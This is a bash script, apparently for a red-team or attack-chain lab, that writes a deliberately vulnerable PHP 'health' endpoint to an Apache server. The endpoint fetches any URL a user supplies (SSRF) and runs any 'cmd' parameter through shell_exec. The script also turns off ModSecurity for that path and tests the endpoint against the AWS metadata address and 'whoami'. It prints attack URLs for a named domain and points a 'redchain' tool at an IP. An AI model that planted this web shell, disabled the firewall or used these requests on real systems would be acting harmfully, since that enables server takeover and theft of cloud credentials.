#!/bin/bash
# health.php 복원 스크립트

echo "[*] Creating /var/www/html/api directory..."
sudo mkdir -p /var/www/html/api

echo "[*] Creating vulnerable health.php for IMDS testing..."
sudo tee /var/www/html/api/health.php > /dev/null << 'EOF'
<?php
header('Content-Type: application/json');

// IMDS v1 취약점 - SSRF를 통한 메타데이터 접근 가능
if (isset($_GET['check']) && $_GET['check'] == 'metadata') {
    if (isset($_GET['url'])) {
        $url = $_GET['url'];

        // SSRF 취약점 - URL 검증 없이 요청
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        echo json_encode([
            'status' => 'ok',
            'metadata' => $result,
            'http_code' => $httpCode
        ]);
        exit;
    }
}

// RCE 취약점 - 명령 실행
if (isset($_GET['check']) && $_GET['check'] == 'custom') {
    if (isset($_GET['cmd'])) {
        $cmd = $_GET['cmd'];

        // 명령 실행 취약점
        $output = shell_exec($cmd . " 2>&1");

        echo json_encode([
            'status' => 'ok',
            'result' => $output,
            'timestamp' => time()
        ]);
        exit;
    }
}

// 기본 응답
echo json_encode([
    'status' => 'healthy',
    'timestamp' => time(),
    'server' => gethostname()
]);
?>
EOF

echo "[*] Setting permissions..."
sudo chown apache:apache /var/www/html/api/health.php
sudo chmod 644 /var/www/html/api/health.php

echo "[*] Creating ModSecurity exception for health.php..."
sudo tee /etc/modsecurity.d/health_php_exception.conf > /dev/null << 'EOF'
# health.php에 대한 ModSecurity 예외 규칙
<LocationMatch "^/api/health\.php">
    SecRuleEngine Off
</LocationMatch>
EOF

echo "[*] Testing health.php locally..."
curl -s localhost/api/health.php
echo ""

echo "[*] Testing SSRF vulnerability..."
curl -s "localhost/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/"
echo ""

echo "[*] Testing RCE vulnerability..."
curl -s "localhost/api/health.php?check=custom&cmd=whoami"
echo ""

# Apache 재시작 (Amazon Linux 2 기준)
if command -v systemctl &> /dev/null; then
    echo "[*] Restarting httpd service..."
    sudo systemctl restart httpd
else
    echo "[*] Restarting apache2 service..."
    sudo service apache2 restart
fi

echo ""
echo "=========================================="
echo "[+] health.php restoration complete!"
echo "=========================================="
echo ""
echo "Test URLs:"
echo "  Basic:    http://healthmash.net/api/health.php"
echo "  SSRF:     http://healthmash.net/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/"
echo "  RCE:      http://healthmash.net/api/health.php?check=custom&cmd=whoami"
echo ""
echo "Now you can run: redchain(13.125.80.75) > imds"
echo "=========================================="
